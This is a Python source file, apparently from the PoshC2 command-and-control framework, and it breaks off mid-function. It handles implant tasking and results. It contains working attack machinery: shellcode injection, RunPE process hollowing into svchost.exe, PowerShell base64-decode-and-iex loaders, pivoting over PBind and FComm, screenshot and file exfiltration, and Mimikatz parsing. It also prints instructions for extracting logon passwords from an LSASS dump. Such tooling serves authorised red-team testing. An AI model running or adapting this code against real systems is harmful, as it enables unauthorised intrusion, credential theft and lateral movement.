import base64
import hashlib
import os
import re
import traceback
from datetime import datetime, timezone

from poshc2 import Colours
from poshc2.Utils import new_implant_id
from poshc2.server.Config import DownloadsDirectory, ReportsDirectory
from poshc2.server.Config import mitre_mapping
from poshc2.server.Core import decrypt, decrypt_bytes_gzip, process_mimikatz, print_bad, print_good
from poshc2.server.Core import load_module, load_module_sharp, encrypt, default_response
from poshc2.server.ImplantExtensions import new_implant, display, autoruns
from poshc2.server.ImplantType import ImplantType
from poshc2.server.PowerStatus import translate_power_status
from poshc2.server.database.Helpers import get_implant, get_implant_by_numeric_id, get_task, get_new_tasks_for_implant, \
    update_task
from poshc2.server.database.Helpers import insert_object, delete_object, select_all, update_object
from poshc2.server.database.Model import Implant, MitreTTP, Task, NewTask


def save_output(output, module_name, hostname):
    try:
        now = datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')
        filename = f"{module_name}_{hostname}_{now}"
        output_file = open(f'{DownloadsDirectory}{filename}.txt', 'w')
        output_file.write(output)
        output_file.close()
        print(f"{module_name} output saved to: {DownloadsDirectory}{filename}.txt")
    except Exception as e:
        print(e)


def save_task_output(uri_path, encrypted_session_cookie, post_data):
    all_implants = select_all(Implant)

    if not all_implants:
        print_bad(
            "Received post request but no implants in database... has the project been cleaned but you're using the same URLs?")
        return

    for implant in all_implants:
        if implant.id in uri_path and encrypted_session_cookie:
            now = datetime.now(timezone.utc)
            update_object(Implant, {Implant.last_seen: now.strftime("%Y-%m-%d %H:%M:%S")}, {Implant.id: implant.id})
            decrypted_cookie = decrypt(implant.encryption_key, encrypted_session_cookie)
            implant_type = ImplantType.get(implant.type)
            user_implant_numeric_id = implant.numeric_id

            if implant_type.is_jxa_implant():
                raw_output = decrypt(implant.encryption_key, post_data[1500:])
            else:
                raw_output = decrypt_bytes_gzip(implant.encryption_key, post_data[1500:])

            if decrypted_cookie.startswith("Error"):
                print(Colours.RED)
                print("The multicmd errored: ")
                print(raw_output)
                print(Colours.GREEN)
                return

            cookie_message = ""

            if "No Task ID" in decrypted_cookie:
                task_id = "No Task ID"
            elif "-" in decrypted_cookie:
                decrypted_cookie = decrypted_cookie.strip('\x00')
                split = decrypted_cookie.split("-")

                if not split[0].isdigit():
                    print(Colours.RED + f"[!] Cookie {decrypted_cookie} is invalid" + Colours.GREEN)
                    return
                else:
                    task_id = str(int(split[0]))
                    cookie_message = split[1]
            else:
                task_id = str(int(decrypted_cookie.strip('\x00')))

            task_id_str = "0" * (5 - len(str(task_id))) + str(task_id)

            user_implant = implant
            if task_id != "99999" and task_id != "No Task ID":
                task = get_task(task_id)
                executed_command = task.command
                task_owner = task.user

                if executed_command.startswith("pbind-command ") or executed_command.startswith(
                        "pbind-load-module ") or executed_command.startswith(
                    "fcomm-command ") or executed_command.startswith("fcomm-load-module "):
                    split_command = executed_command.split()
                    executed_command = split_command[0] + " "
                    executed_command += " ".join(split_command[2:])

                implant_numeric_id = task.implant_numeric_id
                user_implant = get_implant_by_numeric_id(implant_numeric_id)
            elif task_id == "99999":
                # TODO potentially not tracking background tasks for pbind implants correctly here
                implant_numeric_id = implant.numeric_id
                user_implant = get_implant_by_numeric_id(implant_numeric_id)
                print(Colours.END)
                print(
                    f"Background task against implant {implant_numeric_id} on host {user_implant.domain}\\{user_implant.user} @ {user_implant.hostname} ({now.strftime('%Y-%m-%d %H:%M:%S')}) (output appended to {ReportsDirectory}background-data.txt)")
                print(Colours.GREEN)
                background_data_file = open(f"{ReportsDirectory}background-data.txt", "a+")
                background_data_file.write(raw_output)
                return
            else:
                print(Colours.GREEN)
                print("Got response with no Task ID:\n")
                print(raw_output)
                return

            print(Colours.GREEN)

            if task_owner is not None:
                print(
                    f"TaskID:{task_id_str} returned | User:({task_owner}) | ImplantID:{implant_numeric_id} | Context:{user_implant.domain}\\{user_implant.user} @ {user_implant.hostname} | {now.strftime('%Y-%m-%d %H:%M:%S')}")
            else:
                print(
                    f"TaskID:{task_id_str} returned | User:None | ImplantID: {implant_numeric_id} | Context:{user_implant.domain}\\{user_implant.user} @ {user_implant.hostname} | {now.strftime('%Y-%m-%d %H:%M:%S')}")
            try:
                if isinstance(raw_output, bytes):
                    parsed_output = re.sub(r'123456(.+?)654321', '', raw_output.decode('us-ascii', errors="ignore"))
                else:
                    parsed_output = re.sub(r'123456(.+?)654321', '', raw_output)

                parsed_output = parsed_output.rstrip().replace("\x00", "")
            except Exception as e:
                print(f"Error parsing output from implant: {e}")
                parsed_output = ""
                pass

            if cookie_message is not None and cookie_message.lower().startswith("pwrstatusmsg"):
                translate_power_status(parsed_output, implant.id)
                return

            if "load-module" in executed_command and len(parsed_output.split()) == 0:
                print("Module loaded successfully")
                update_task(task_id, "Module loaded successfully")
            elif "pbind-connect " in executed_command and "PBind-Connected" in parsed_output or "PBind PBind start" in executed_command and "PBind-Connected" in parsed_output:
                # TODO refactor to work same as other implants
                try:
                    parsed_output = re.search("PBind-Connected:.*", parsed_output)
                    parsed_output = parsed_output[0].replace("PBind-Connected: ", "")
                    domain, user, hostname, architecture, process_id, process_name, comms_id = str(parsed_output).split(
                        ";")

                    if "\\" in user:
                        user = user[user.index("\\") + 1:]

                    new_pbind_implant, updated_config = new_implant(implant.numeric_id, ImplantType.SharpPBind,
                                                                    str(domain), str(user), str(hostname), architecture,
                                                                    process_id,
                                                                    str(process_name), comms_id,
                                                                    label=f"Parent: {implant_numeric_id}")
                    display(new_pbind_implant)
                    autoruns(new_pbind_implant)
                except Exception as e:
                    print(e)
            elif executed_command.lower().startswith("run-exe seatbelt"):
                print(raw_output)
                save_output(raw_output, "Seatbelt", implant.hostname)
            elif "fcomm-connect " in executed_command and "FComm-Connected" in parsed_output:
                # TODO refactor to work same as other implants
                parsed_output = re.search("FComm-Connected:.*", parsed_output)
                parsed_output = parsed_output[0].replace("FComm-Connected: ", "")
                domain, user, hostname, architecture, process_id, process_name, comms_id = str(parsed_output).split(";")

                if "\\" in user:
                    user = user[user.index("\\") + 1:]

                # TODO refactor so parent not stored in ip address column
                new_fcomm_implant, updated_config = new_implant(implant.numeric_id, ImplantType.SharpFComm, str(domain),
                                                                str(user), str(hostname), architecture, process_id,
                                                                str(process_name), comms_id,
                                                                label=f"Parent: {implant_numeric_id}")
                display(new_fcomm_implant)
                autoruns(new_fcomm_implant)
            elif executed_command.lower().startswith("beacon "):
                new_sleep = executed_command.replace('beacon ', '').strip()
                update_object(Implant, {Implant.sleep: new_sleep}, {Implant.id: implant.id})
            elif "get-screenshot" in executed_command.lower() or "get-multi-screenshot" in executed_command.lower():
                try:
                    decoded = base64.b64decode(parsed_output)
                    filename = implant.user + "-" + now.strftime("%Y%m%d%H%M%S_" + new_implant_id())
                    output_file = open(f'{DownloadsDirectory}{filename}.png', 'wb')
                    print(f"Screenshot captured: {DownloadsDirectory}{filename}.png")
                    update_task(task_id, f"Screenshot captured: {DownloadsDirectory}{filename}.png")
                    output_file.write(decoded)
                    output_file.close()
                except Exception:
                    update_task(task_id,
                                "Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
                    print(
                        "Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
                    print(parsed_output)
            elif executed_command.lower().startswith("run-exe quickdraw"):
                if parsed_output.startswith("[-]"):
                    update_task(task_id, parsed_output)
                    print(parsed_output)
                else:
                    decoded = base64.b64decode(parsed_output)
                    filename = f"{implant.user}-QuickDraw-{now.strftime('%Y%m%d%H%M%S')}"
                    output_file = open(f'{DownloadsDirectory}{filename}.png', 'wb')
                    print(f"Screenshot captured: {DownloadsDirectory}{filename}.png")
                    update_task(task_id, f"Screenshot captured: {DownloadsDirectory}{filename}.png")
                    output_file.write(decoded)
                    output_file.close()
            elif (executed_command.lower().startswith("$shellcode64")) or (
                    executed_command.lower().startswith("$shellcode64")):
                update_task(task_id, "Upload shellcode complete")
                print("Upload shellcode complete")
            elif (executed_command.lower().startswith("run-exe core.program core inject-shellcode")) or (
                    executed_command.lower().startswith("pbind-command run-exe core.program core inject-shellcode")):
                update_task(task_id, "Upload shellcode complete")
                print(parsed_output)
            elif "memoryonlyjson" in executed_command.lower() or "memoryonlyzip" in executed_command.lower():
                try:
                    if "Initializing SharpHound" in raw_output:
                        update_task(task_id, raw_output)
                        print(raw_output)
                    else:
                        print("Downloading bloodhound")
                        print(raw_output)
                except TypeError as e:
                    try:
                        filename = "bloodhound-" + now.strftime("%Y%m%d%H%M%S_" + new_implant_id()) + ".bin"
                        print(f"Downloaded file {filename} ")
                        output_file = open(f'{DownloadsDirectory}{filename}', 'ab')

                        try:
                            output_file.write(raw_output)
                        except Exception:
                            output_file.write(raw_output.encode("utf-8"))

                        output_file.close()
                    except ValueError:
                        print(f"Error downloading bloodhound file {e} \n{raw_output}")
                    except Exception as e:
                        print("Error downloading bloodhound file %s " % e)
                        traceback.print_exc()
                except Exception as e:
                    print("Error with bloodhound %s " % e)
                    traceback.print_exc()
            elif "download-file" in executed_command.lower():
                try:

                    filename = executed_command.lower().replace("download-files ", "")
                    filename = filename.replace("download-file ", "")
                    filename = filename.replace("-source ", "")
                    filename = filename.replace("..", "")
                    filename = filename.replace("'", "")
                    filename = filename.replace('"', "")
                    filename = filename.replace("\\", "/")
                    directory, filename = filename.rsplit('/', 1)
                    filename = filename.rstrip('\x00')
                    original_filename = filename.strip()

                    if not original_filename:
                        directory = directory.rstrip('\x00')
                        directory = directory.replace("/", "_").replace("\\", "_").strip()
                        original_filename = directory

                    try:
                        if raw_output.startswith("Error"):
                            print("Error downloading file: ")
                            print(raw_output)
                            break

                        chunk_number = raw_output[:5]
                        total_chunks = raw_output[5:10]
                    except Exception:
                        chunk_number = raw_output[:5].decode("utf-8")
                        total_chunks = raw_output[5:10].decode("utf-8")

                    if (chunk_number == "00001") and os.path.isfile(f'{DownloadsDirectory}{filename}'):
                        counter = 1

                        while os.path.isfile(f'{DownloadsDirectory}{filename}'):
                            if '.' in filename:
                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(
                                    counter) + original_filename[original_filename.rfind('.'):]
                            else:
                                filename = original_filename + '-' + str(counter)

                            counter += 1

                    if chunk_number != "00001":
                        counter = 1

                        if not os.path.isfile(f'{DownloadsDirectory}{filename}'):
                            print(
                                f"Error trying to download part of a file to a file that does not exist: {filename} \n{raw_output}")

                        while os.path.isfile(f'{DownloadsDirectory}{filename}'):
                            # First find the 'next' file would be downloaded to
                            if '.' in filename:
                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(
                                    counter) + original_filename[original_filename.rfind('.'):]
                            else:
                                filename = original_filename + '-' + str(counter)

                            counter += 1

                        if counter != 2:
                            # Then actually set the filename to this file - 1 unless it's the first one and exists without a counter
                            if '.' in filename:
                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(
                                    counter - 2) + original_filename[original_filename.rfind('.'):]
                            else:
                                filename = original_filename + '-' + str(counter - 2)
                        else:
                            filename = original_filename

                    print(f"Download file part {chunk_number} of {total_chunks} to: {filename}")
                    update_task(task_id, f"Download file part {chunk_number} of {total_chunks} to: {filename}")
                    output_file = open(f'{DownloadsDirectory}{filename}', 'ab')

                    try:
                        output_file.write(raw_output[10:])
                    except Exception:
                        output_file.write(raw_output[10:].encode("utf-8"))

                    output_file.close()
                except ValueError as e:
                    update_task(task_id, f"Error downloading file {e} \n{raw_output}")
                    print(f"Error downloading file {e} \n{raw_output}")
                except Exception as e:
                    update_task(task_id, f"Error downloading file {e} ")
                    print(f"Error downloading file {e} ")
                    traceback.print_exc()
            elif "safetydump" in executed_command.lower():
                raw_output = decrypt_bytes_gzip(implant.encryption_key, post_data[1500:])

                if raw_output.startswith("[-]") or raw_output.startswith("ErrorCmd"):
                    update_task(task_id, raw_output)
                    print(raw_output)
                else:
                    dumpname = f"SafetyDump-Task-{task_id_str}.b64"
                    dumppath = f"{DownloadsDirectory}{dumpname}"
                    open(dumppath, 'w').write(raw_output)
                    message = f"Dump written to: {dumppath}"
                    message = message + "\n The base64 blob needs decoding, e.g. on Windows to use Mimikatz:"
                    message = message + f"\n     $filename = '.\\{dumpname}'"
                    message = message + "\n     $b64 = Get-Content $filename"
                    message = message + "\n     $bytes = [System.Convert]::FromBase64String($b64)"
                    message = message + "\n     [io.file]::WriteAllBytes(((Get-Item -Path \".\\\").FullName) + '\\safetydump.dmp', $bytes)"
                    message = message + "\n     ./mimikatz.exe"
                    message = message + "\n     sekurlsa::minidump safetydump.dmp"
                    message = message + "\n     sekurlsa::logonpasswords"
                    message = message + "\nOr to just decode on Linux:"
                    message = message + f"\n     base64 -id {dumpname} > dump.bin"
                    update_task(task_id, message)
                    print(message)
            elif (executed_command.lower().startswith(
                    "run-exe safetykatz") or "invoke-mimikatz" in executed_command or executed_command.lower().startswith(
                "pbind-") or executed_command.lower().startswith(
                "fcomm-command") or executed_command.lower().startswith(
                "run-dll sharpsploit")) and "logonpasswords" in parsed_output.lower():
                print("Parsing Mimikatz Output")
                update_task(task_id, parsed_output)
                process_mimikatz(parsed_output)
                print(Colours.GREEN)
                print(parsed_output + Colours.END)
            elif "| poshgrep" in executed_command.lower():
                update_task(task_id, parsed_output)
                print(Colours.GREEN)
                params = re.compile(r'(?<=poshgrep)\s(.*)')
                params = params.findall(executed_command)

                if params:
                    print(f"[+] Grepping output for {params[0]}: \n")
                else:
                    print(parsed_output)

                for line in parsed_output.splitlines():
                    if params[0].lower() in line.lower():
                        print(line)

                print(Colours.END)

            else:
                update_task(task_id, parsed_output)
                print(Colours.GREEN)
                print(parsed_output + Colours.END)

            # TODO Task Callbacks
            for mapped_command in mitre_mapping:
                if mapped_command["command"] in executed_command.lower():
                    for ttp in mapped_command["ttps"]:
                        mitre_ttp = MitreTTP(
                            technique_id=ttp["id"],
                            technique_name=ttp["name"],
                            tactics=", ".join(tactic for tactic in ttp["tactics"]),
                            task_id=task_id
                        )

                        insert_object(mitre_ttp)


def new_task(path):
    all_implants = select_all(Implant)
    commands = ""

    if all_implants:
        for implant in all_implants:
            implant_id = implant.id
            new_tasks = get_new_tasks_for_implant(implant_id)
            user_implant_numeric_id = implant.numeric_id
            implant_type = ImplantType.get(implant.type)
            user_implant = implant

            if implant_id in path and new_tasks:
                for new_task in new_tasks:
                    command = new_task.command
                    user = new_task.user

                    if command.startswith("pbind-command ") or command.startswith(
                            "pbind-load-module ") or command.startswith("fcomm-command ") or command.startswith(
                        "fcomm-load-module "):
                        split_command = command.split()
                        user_implant_numeric_id = split_command[1]
                        user_implant = get_implant_by_numeric_id(user_implant_numeric_id)
                        implant_id = user_implant.id
                        command = split_command[0] + " "
                        command += " ".join(split_command[2:])
                        user_command = command.replace("fcomm-command ", "").replace("pbind-command ", "").replace(
                            "pbind-load-module ", "load-module ").replace(
                            "fcomm-load-module ", "load-module ")
                    else:
                        user_command = command

                    if (command.lower().startswith("inject-shellcode")) or (
                            command.lower().startswith("$shellcode64")) or (
                            command.lower().startswith("$shellcode86") or command.lower().startswith(
                        "run-exe core.program core inject-shellcode") or command.lower().startswith(
                        "run-exe pbind pbind run-exe core.program core inject-shellcode") or command.lower().startswith(
                        "pbind-command run-exe core.program core inject-shellcode")):
                        if " -Shellcode" not in command:
                            user_command = f"Inject Shellcode: {command[command.index('#') + 1:]}"
                            command = command[:command.index("#")]
                    elif (command.lower().startswith("invoke-daisychain")):
                        user_command = "start-daisy"
                    elif command.startswith("update-config "):
                        user_command = "Updating config with config string:\n" + command.replace("update-config ", "")
                    elif (command.lower().startswith("run-jxa ")) or (command.lower().startswith("clipboard-monitor ")):
                        user_command = command[:command.index("#")]
                        command = "run-jxa " + command[command.index("#") + 1:]
                    elif (command.lower().startswith('download-file') or command.lower().startswith(
                            'pbind-command download-file') or command.lower().startswith(
                        'fcomm-command download-file')):
                        if implant_type.is_sharp_implant():
                            download_file = base64.b64decode(command.split()[1]).decode("utf-8")
                            user_command = f"download-file {download_file}"

                    elif (command.lower().startswith('upload-file') or command.lower().startswith(
                            'pbind-command upload-file') or command.lower().startswith(
                        'fcomm-command upload-file')):
                        # TODO refactor
                        PBind = False
                        FComm = False

                        if command.lower().startswith('pbind-command upload-file'):
                            PBind = True

                        if command.lower().startswith('fcomm-command upload-file'):
                            FComm = True

                        upload_args = command \
                            .replace('pbind-command upload-file', '') \
                            .replace('fcomm-command upload-file', '') \
                            .replace('upload-file', '')

                        upload_file_args_split = upload_args.split()

                        if len(upload_file_args_split) < 2:
                            print(Colours.RED)
                            print(f"Error parsing upload command: {upload_args}")
                            print(Colours.GREEN)
                            continue

                        upload_file = upload_file_args_split[0]
                        upload_file_destination = upload_file_args_split[1]
                        upload_args = upload_args.replace(upload_file, '')
                        upload_args = upload_args.replace(upload_file_destination, '')

                        with open(upload_file, "rb") as f:
                            upload_file_bytes = f.read()

                        if not upload_file_bytes:
                            print(
                                Colours.RED + f"Error, no bytes read from the upload file, removing task: {upload_file}" + Colours.GREEN)
                            delete_object(NewTask, {NewTask.id: new_task.id})
                            continue

                        upload_file_bytes_b64 = base64.b64encode(upload_file_bytes).decode("utf-8")
                        native_args = command.replace(upload_file, upload_file_bytes_b64)
                        upload_file_path = upload_file_destination

                        if implant_type.is_sharp_implant():
                            command = f"upload-file {upload_file_bytes_b64};\"{upload_file_destination}\" {upload_args}"
                            upload_file_path = base64.b64decode(upload_file_destination).decode("utf-8")
                        elif implant_type.is_powershell_implant():
                            command = f"Upload-File -Destination \"{upload_file_destination}\" -Base64 {upload_file_bytes_b64} {upload_args}"
                        elif implant_type.is_python_implant():
                            command = f"upload-file \"{upload_file_destination}\":{upload_file_bytes_b64} {upload_args}"
                        elif implant_type.is_linux_implant():
                            command = f"upload-file:{upload_file_destination}:{upload_file_bytes_b64} {upload_args}"
                        elif implant_type.is_jxa_implant():
                            command = f"upload-file {upload_file_destination}:{upload_file_bytes_b64} {upload_args}"
                        else:
                            raise f"Unknown implant type: {implant.type}"

                        if PBind:
                            command = f"pbind-command {command}"

                        if FComm:
                            command = f"fcomm-command {command}"

                        md5_filehash = hashlib.md5(base64.b64decode(upload_file_bytes_b64)).hexdigest()
                        sha256_filehash = hashlib.sha256(base64.b64decode(upload_file_bytes_b64)).hexdigest()
                        user_command = f"Uploading file: {upload_file} to {upload_file_path} with md5: {md5_filehash} sha256: {sha256_filehash}"

                    task = Task(
                        implant_id=implant_id,
                        command=user_command,
                        output=None,
                        user=user,
                        sent_time=datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S'),
                        completed_time=None,
                        implant_numeric_id=get_implant(implant_id).numeric_id,
                        child_implant_id=None
                    )

                    insert_object(task)
                    task_id_string = "0" * (5 - len(str(task.id))) + str(task.id)

                    if len(str(task.id)) > 5:
                        raise ValueError('Task ID is greater than 5 characters which is not supported.')

                    print(Colours.YELLOW)
                    now = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')

                    if user is not None and user != "":
                        print(
                            f"TaskID:{task_id_string} sent | User:({user}) | ImplantID:{user_implant_numeric_id} | Context:{user_implant.domain}\\{user_implant.user} @ {user_implant.hostname} | {now}")
                    else:
                        print(
                            f"TaskID:{task_id_string} sent | User:None | ImplantID:{user_implant_numeric_id} | Context:{user_implant.domain}\\{user_implant.user} @ {user_implant.hostname} | {now}")

                    try:
                        if (user_command.lower().startswith(
                                "run-exe sharpwmi.program sharpwmi action=execute") or user_command.lower().startswith(
                            "pbind-command run-exe sharpwmi.program sharpwmi action=execute") or user_command.lower().startswith(
                            "fcomm-command run-exe sharpwmi.program sharpwmi action=execute")):
                            print(user_command[0:200])
                            print("----TRUNCATED----")
                        else:
                            print(user_command)
                        print(Colours.END)
                    except Exception as e:
                        print(f"Cannot print output: {e}")

                    if command.startswith("run-temp-appdomain "):
                        try:
                            module_name = command.split()[1]
                            base64_module = load_module_sharp(module_name)
                            command = command.replace(module_name, f"{base64_module}")
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            command = "Module not found"
                    elif command.startswith("load-module "):
                        try:
                            module_name = command.replace("load-module ", "")
                            if ".exe" in module_name or ".dll" in module_name:                                                                
                                if implant_type==ImplantType.PowerShellHttp:
                                    module=load_module_sharp(module_name)
                                    base64_module=f"$ps=\"{module}\";$dllbytes=[System.Convert]::FromBase64String($ps);$assembly=[System.Reflection.Assembly]::Load($dllbytes)"
                                    print_bad("Usage Manual: [SharpTask.Program]::printUsage(@(\"Arg1\", \"Arg2\"));")
                                    print_bad("OR: load-module Invoke-Sharp.ps1")
                                    print_bad("OR: Get-Help Invoke-Sharp -examples")
                                    print_bad("OR: List-Assemblies")
                                else:
                                    base64_module = load_module_sharp(module_name)
                            # if its a powershell implant
                            else:
                                base64_module = load_module(module_name)
                            command = f"load-module{base64_module}"
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            command = "echo Module not found"
                    elif command.startswith("run-exe Program PS "):
                        try:
                            pbind_command = command.replace("run-exe Program PS ", "")
                            base64_module = base64.b64encode(pbind_command.encode("utf-8")).decode("utf-8")
                            command = f"run-exe Program PS {base64_module}"
                        except Exception as e:
                            print("Cannot base64 the command for PS")
                            print(e)
                            traceback.print_exc()
                    elif command.startswith("inject-dll"):
                        try:
                            module_name = command.split()[1]
                            base64_module = load_module_sharp(module_name, "PEs/")
                            command = command.replace(module_name, f"{base64_module}")
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            command = "echo Module not found"
                    elif command.startswith("load-stage2"):
                        try:
                            module_name = command.split()[1]
                            base64_module = load_module_sharp(module_name)
                            command = command.replace(module_name, f"{base64_module}")
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            command = "echo Module not found"
                    elif command.startswith("run-assembly"):
                        try:
                            module_name = command.split()[1]
                            base64_module = load_module_sharp(module_name)
                            echo_module_base64_string = load_module_sharp("Echo.exe")
                            command = command.replace(module_name, f"{echo_module_base64_string} {base64_module}")
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            command = "echo Module not found"
                    elif command.startswith("run-exe RunPE.Program RunPE"):
                        try:
                            module_name = command.split()[3]
                            module_args = command.split(".exe")[1]

                            if module_args:
                                b64args = base64.b64encode(f"{module_args}".encode("utf-8")).decode("utf-8")
                                module_args = f"---a {b64args}"
                            if ".exe" in module_name:
                                base64_module = load_module_sharp(module_name, "PEs/")
                                command = command.replace(module_name, f"---b {base64_module} {module_args}")
                                # TODO svchost??
                                command = f"{command} ---f c:\\windows\\system32\\svchost.exe"
                            else:
                                print(f"Unsupported RunPE module: {module_name}")
                                return
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            command = "echo Module not found"
                    elif command.startswith("pbind-command run-exe RunPE.Program RunPE"):
                        try:
                            module_name = command.split()[4]
                            module_args = command.split(".exe")[1]

                            if module_args:
                                b64args = base64.b64encode(f"{module_args}".encode("utf-8")).decode("utf-8")
                                module_args = f"---a {b64args}"
                            if ".exe" in module_name:
                                base64_module = load_module_sharp(module_name, "PEs/")
                                command = command.replace(module_name, f"---b {base64_module} {module_args}").replace(
                                    "pbind-command ", "")
                                # TODO svchost??
                                command = f"{command} ---f c:\\windows\\system32\\svchost.exe"
                                base64_pbind_command = base64.b64encode(command.encode("utf-8")).decode("utf-8")
                                base64_pbind_command = task_id_string + base64_pbind_command
                                command = f"run-exe PBind PBind {base64_pbind_command}"
                            else:
                                print(f"Unsupported RunPE module: {module_name}")
                                return
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            command = "echo Module not found"
                    elif command.startswith("run-exe RunOF.Program RunOF"):
                        try:
                            module_name = command.split()[3]

                            if ".o" in module_name:
                                base64_module = "-a " + load_module_sharp(module_name, "OFs/")
                                command = command.replace(module_name, base64_module)
                            else:
                                print(f"Unsupported RunOF module: {module_name}")
                                return
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            command = "echo Module not found"
                    elif command.startswith("pbind-command run-exe RunOF.Program RunOF"):
                        try:
                            module_name = command.split()[4]

                            if ".o" in module_name:
                                base64_module = "-a " + load_module_sharp(module_name, "OFs/")
                                command = command.replace(module_name, base64_module).replace("pbind-command ", "")
                                base64_pbind_command = base64.b64encode(command.encode("utf-8")).decode("utf-8")
                                base64_pbind_command = task_id_string + base64_pbind_command
                                command = f"run-exe PBind PBind {base64_pbind_command}"
                            else:
                                print(f"Unsupported RunOF module: {module_name}")
                                return
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            command = "echo Module not found"
                    elif command.startswith("pbind-command run-exe Program PS "):
                        try:
                            pbind_command = command.replace("pbind-command run-exe Program PS ", "")
                            base64_pbind_command = base64.b64encode(pbind_command.encode("utf-8")).decode("utf-8")
                            base64_module = base64.b64encode(
                                f"run-exe Program PS {base64_pbind_command}".encode("utf-8")).decode("utf-8")
                            base64_module = task_id_string + base64_module
                            command = f"run-exe PBind PBind {base64_module}"
                        except Exception as e:
                            print("Cannot base64 the command for PS")
                            print(e)
                            traceback.print_exc()
                    elif command.startswith("fcomm-command run-exe Program PS "):
                        try:
                            pbind_command = command.replace("fcomm-command run-exe Program PS ", "")
                            base64_module = base64.b64encode(pbind_command.encode("utf-8")).decode("utf-8")
                            command = f"run-exe FComm.FCClass FComm run-exe Program PS {base64_module}"
                        except Exception as e:
                            print("Cannot base64 the command for PS")
                            print(e)
                            traceback.print_exc()
                    elif command.startswith("fcomm-command run-exe Program PS "):
                        try:
                            pbind_command = command.replace("fcomm-command run-exe Program PS ", "")
                            base64_module = base64.b64encode(pbind_command.encode("utf-8")).decode("utf-8")
                            command = f"run-exe FComm.FCClass FComm run-exe Program PS {base64_module}"
                        except Exception as e:
                            print("Cannot base64 the command for PS")
                            print(e)
                            traceback.print_exc()
                    elif command.startswith("pslo "):
                        try:
                            module_name = command.replace("pslo ", "")
                            base64_module = load_module_sharp(module_name)
                            command = f"run-exe Program PS loadmodule{base64_module}"
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            traceback.print_exc()
                    # TODO pslo pull out
                    elif command.startswith("pbind-pslo"):
                        try:
                            module_name = command.replace("pbind-pslo ", "")
                            base64_module = load_module_sharp(module_name)
                            pbind_command = f"run-exe Program PS loadmodule{base64_module}"
                            base64_pbind_command = base64.b64encode(pbind_command.encode("utf-8")).decode("utf-8")
                            base64_pbind_command = task_id_string + base64_pbind_command
                            command = f"run-exe PBind PBind {base64_pbind_command}"
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            traceback.print_exc()
                    elif command.startswith("fcomm-pslo"):
                        try:
                            module_name = command.replace("fcomm-pslo ", "")
                            base64_module = load_module_sharp(module_name)
                            command = f"run-exe FComm.FCClass FComm \"run-exe Program PS load-module{base64_module}\""
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            traceback.print_exc()
                    elif command.startswith("pbind-load-module "):
                        try:
                            module_name = command.replace("pbind-load-module ", "")

                            if ".exe" in module_name or ".dll" in module_name:
                                base64_module = load_module_sharp(module_name)
                                command = f"run-exe PBind PBind \"{task_id_string}load-module{base64_module}\""
                            else:
                                base64_module = load_module(module_name)
                                command = "run-exe PBind PBind \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(
                                    bytes(base64_module, "utf-8")).decode('utf-8')
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            traceback.print_exc()
                    elif command.startswith("pbind-command "):
                        try:
                            pbind_command = command.replace("pbind-command ", "")
                            base64_pbind_command = base64.b64encode(pbind_command.encode("utf-8")).decode("utf-8")
                            base64_pbind_command = task_id_string + base64_pbind_command
                            command = f"run-exe PBind PBind {base64_pbind_command}"
                        except Exception as e:
                            print("Cannot base64 the command for PS")
                            print(e)
                            traceback.print_exc()
                    elif command.startswith("pbind-connect"):
                        command = command.replace("pbind-connect ", "run-exe PBind PBind start ")
                    elif "pbind-unlink" in command:
                        command = f"run-exe PBind PBind {task_id_string}pbind-unlink"
                    elif command.startswith("fcomm-load-module "):
                        try:
                            module_name = command.replace("fcomm-load-module ", "")

                            if ".exe" in module_name or ".dll" in module_name:
                                base64_module = load_module_sharp(module_name)
                                command = f"run-exe FComm.FCClass FComm \"{task_id_string}load-module{base64_module}\""
                            else:
                                base64_module = load_module(module_name)
                                command = "run-exe FComm.FCClass FComm \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(
                                    bytes(base64_module, "utf-8")).decode('utf-8')
                        except Exception as e:
                            print("Cannot find module, load-module is case sensitive!")
                            print(e)
                            traceback.print_exc()
                    elif command.startswith("fcomm-command "):
                        command = command.replace("fcomm-command ", f"run-exe FComm.FCClass FComm {task_id_string}")
                    elif command.startswith("fcomm-connect"):
                        command = command.replace("fcomm-connect ", "run-exe FComm.FCClass FComm start ")
                    elif "poshgrep" in command:
                        params = re.compile("\\|poshgrep(.*)", re.IGNORECASE)
                        command = params.sub("", command)
                        params = re.compile("\\| poshgrep(.*)", re.IGNORECASE)
                        command = params.sub("", command)

                    command = task_id_string + command

                    if commands:
                        commands += "!d-3dion@LD!-d" + command
                    else:
                        commands += command

                    delete_object(NewTask, {NewTask.id: new_task.id})

                multicmd = ""

                if commands is not None:
                    multicmd = f"multicmd{commands}"
                try:
                    responseVal = encrypt(implant.encryption_key, multicmd)
                except Exception as e:
                    responseVal = ""
                    print(f"Error encrypting value: {e}")

                now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
                update_object(Implant, {Implant.last_seen: now, Implant.alive: "Yes"}, {Implant.id: implant_id})
                return responseVal
            elif implant_id in path and not new_tasks:
                # if there is no tasks but it's a normal beacon send 200
